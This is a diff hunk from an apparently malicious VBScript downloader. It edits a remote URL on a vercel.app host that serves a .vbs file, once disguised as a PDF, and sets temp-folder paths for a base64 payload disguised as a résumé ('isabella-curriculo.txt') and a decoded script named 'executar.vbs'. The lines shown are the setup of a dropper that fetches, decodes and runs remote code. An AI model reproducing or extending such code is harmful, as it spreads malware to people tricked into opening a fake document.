@@ -5,7 +5,7 @@ Set fso = CreateObject("Scripting.FileSystemObject")
 Set shell = CreateObject("WScript.Shell")
 tempFolder = fso.GetSpecialFolder(2)
 
-url = "https://testando123-blond.vercel.app/Documento0001.pdf-.vbs"
+url = "https://testando123-blond.vercel.app/Documento0001.vbs"
 vbsOriginal = tempFolder & "\original.vbs"
 base64File = tempFolder & "\isabella-curriculo.txt"
 vbsDecoded = tempFolder & "\executar.vbs"
